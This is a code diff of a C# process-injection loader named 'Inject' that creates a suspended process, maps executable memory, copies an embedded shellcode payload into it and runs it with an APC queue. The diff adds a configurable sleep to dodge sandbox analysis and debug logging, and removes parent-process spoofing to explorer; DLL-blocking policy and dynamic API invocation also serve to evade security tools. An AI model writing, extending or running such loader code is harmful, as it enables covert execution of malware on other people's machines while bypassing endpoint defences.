@@ -30,8 +30,14 @@ namespace Inject
 #if DEBUG
                 Console.WriteLine("Creating Process !");
                 Console.WriteLine(app);
-                Console.WriteLine("version 2.2");
+                Console.WriteLine("version 2.3");
+
+                //File.AppendAllText(@"c:\users\olivier\log.txt",$"{DateTime.Now} RunningInjector{Environment.NewLine}");
 #endif
+                int delay = 60;
+                int.TryParse(Properties.Resources.Delay, out delay);
+
+                Thread.Sleep(delay * 1000);
 
                 var startupInfoEx = new STARTUPINFOEX();
 
@@ -47,17 +53,6 @@ namespace Inject
                     ref startupInfoEx.lpAttributeList,
                     (IntPtr)MITIGATION_POLICY,
                     ref blockDllPtr);
-
-                const int PARENT_PROCESS = 0x00020000;
-
-                var ppidPtr = Marshal.AllocHGlobal(IntPtr.Size);
-                var hParent = System.Diagnostics.Process.GetProcessesByName("explorer")[0].Handle;
-                Marshal.WriteIntPtr(ppidPtr, hParent);
-
-                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
-                    ref startupInfoEx.lpAttributeList,
-                    (IntPtr)PARENT_PROCESS,
-                    ref ppidPtr);
 
                 const uint CREATE_SUSPENDED = 0x00000004;
                 const uint DETACHED_PROCESS = 0x00000008;
@@ -80,6 +75,16 @@ namespace Inject
 
                 byte[] shellcode = Properties.Resources.Payload;
 
+
+#if DEBUG
+                //Console.WriteLine("Going to sleep");
+#endif
+
+
+                //Thread.Sleep(90000);
+
+                //File.AppendAllText(@"c:\users\olivier\log.txt", $"{DateTime.Now} Process Created{Environment.NewLine}");
+
                 const uint GENERIC_ALL = 0x10000000;
                 const uint PAGE_EXECUTE_READWRITE = 0x40;
                 const uint SEC_COMMIT = 0x08000000;
@@ -100,10 +105,16 @@ namespace Inject
 
                 var self = System.Diagnostics.Process.GetCurrentProcess();
                 var hLocalBaseAddress = IntPtr.Zero;
+                var hProcess = self.Handle; //NtMapViewOfSection will not work if i rmove this line. dunno why....
+
+                //string msg = $"{DateTime.Now} Self =  {self.ProcessName} {self.Handle} {Environment.NewLine}";
+                //var name = self.ProcessName; //NtMapViewOfSection will not work if i rmove this line. dunno why....
+                //File.AppendAllText(@"c:\users\olivier\log.txt", msg);
+                //File.AppendAllText(@"c:\users\olivier\log.txt", $"{DateTime.Now} First map {maxSize},{hLocalSection}  {Environment.NewLine}");
 
                 status = Native.NtMapViewOfSection(
                     hLocalSection,
-                    self.Handle,
+                    hProcess,
                     ref hLocalBaseAddress,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -116,6 +127,8 @@ namespace Inject
                 const uint PAGE_EXECUTE_READ = 0x20;
 
                 var hRemoteBaseAddress = IntPtr.Zero;
+
+                //File.AppendAllText(@"c:\users\olivier\log.txt", $"{DateTime.Now} Second map {Environment.NewLine}");
 
                 status = Native.NtMapViewOfSection(
                     hLocalSection,
@@ -131,6 +144,8 @@ namespace Inject
 
                 Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);
 
+
+
                 var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
                 processInfo.hThread,
                 hRemoteBaseAddress,
@@ -145,6 +160,7 @@ namespace Inject
 #if DEBUG
                 Console.WriteLine(e.ToString());
 #endif
+                File.AppendAllText(@"c:\users\olivier\log.txt", $"{DateTime.Now} : Error => {e.ToString()}{Environment.NewLine}");
             }
             finally
             {
@@ -156,6 +172,8 @@ namespace Inject
 
 #if DEBUG
             Console.WriteLine("End Injects !");
+            Console.WriteLine("Plz key!");
+            Console.ReadKey();
 #endif
         }
     }
